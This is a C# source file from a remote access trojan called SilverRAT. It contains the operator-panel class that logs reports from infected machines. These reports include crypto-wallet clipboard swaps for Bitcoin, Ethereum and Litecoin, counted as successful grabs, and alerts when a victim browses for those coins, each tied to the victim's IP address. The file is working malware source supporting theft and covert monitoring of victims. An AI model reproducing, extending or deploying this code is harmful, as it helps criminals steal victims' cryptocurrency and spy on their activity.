using SilverRAT.Connection;
using SilverRAT.Helper;
using SilverRAT.Properties;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class HandelListMonitor
{
    public HandelListMonitor(Clients client, string Title, string Msg)
    {
        try
        {
            DataGridViewRow item = new DataGridViewRow
            {
                Height = 24
            };
            item.Cells.Add(new DataGridViewImageCell
            {
                Value = GetIcon(Title, Msg, client),
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = DateTime.Now.ToLongTimeString()
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = client.Ip
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Title
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Msg
            });
            _ = item.Cells[2];
            if (Program.Silver.InvokeRequired)
            {
                Program.Silver.Invoke((MethodInvoker)delegate
                {
                    lock (Settings.LockListviewLogs)
                    {
                        Program.Silver.LogsMonitor.Rows.Insert(0, item);
                    }
                });
                return;
            }
            lock (Settings.LockListviewLogs)
            {
                Program.Silver.LogsMonitor.Rows.Insert(0, item);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }

    private Image GetIcon(string Title, string Msg, Clients client)
    {
        if (Title.ToLower() == "btc")
        {
            Settings.CountGrabber++;
            Notifiecation.Show("     Bitcoin", "     Your wallet address has been copied : " + client.Ip + " ", Resources.LogsBTC, Color.FromArgb(234, 139, 25));
            return Resources.LogsBTC;
        }
        if (Title.ToLower() == "eth")
        {
            Settings.CountGrabber++;
            Notifiecation.Show("     Ethereum", "     Your wallet address has been copied : " + client.Ip + " ", Resources.LogsETH, Color.FromArgb(46, 46, 46));
            return Resources.LogsETH;
        }
        if (Title.ToLower() == "ltc")
        {
            Settings.CountGrabber++;
            Notifiecation.Show("     Litecoin", "     Your wallet address has been copied : " + client.Ip + " ", Resources.LogsLTC, Color.FromArgb(234, 101, 33));
            return Resources.LogsLTC;
        }
        if (Title.ToLower().Contains("btc") || Msg.ToLower().Contains("btc"))
        {
            Settings.CountMonitor++;
            Notifiecation.Show("     Session monitor", "     The client browses for a coin BTC : " + client.Ip + " ", Resources.LogsBTC, Color.FromArgb(234, 139, 25));
            return Resources.LogsBTC;
        }
        if (Title.ToLower().Contains("eth") || Msg.ToLower().Contains("eth"))
        {
            Settings.CountMonitor++;
            Notifiecation.Show("     Session monitor", "     The client browses for a coin ETH : " + client.Ip + " ", Resources.LogsETH, Color.FromArgb(46, 46, 46));
            return Resources.LogsETH;
        }
        if (Title.ToLower().Contains("ltc") || Msg.ToLower().Contains("ltc"))
        {
            Settings.CountMonitor++;
            Notifiecation.Show("     Session monitor", "     The client browses for a coin LTC : " + client.Ip + " ", Resources.LogsLTC2, Color.FromArgb(234, 101, 33));
            return Resources.LogsLTC2;
        }
        Notifiecation.Show("     Session monitor", "     " + Msg + " : " + client.Ip, Resources.LogsMony, Color.FromArgb(248, 189, 9));
        Settings.CountMonitor++;
        return Resources.LogsMony;
    }
}
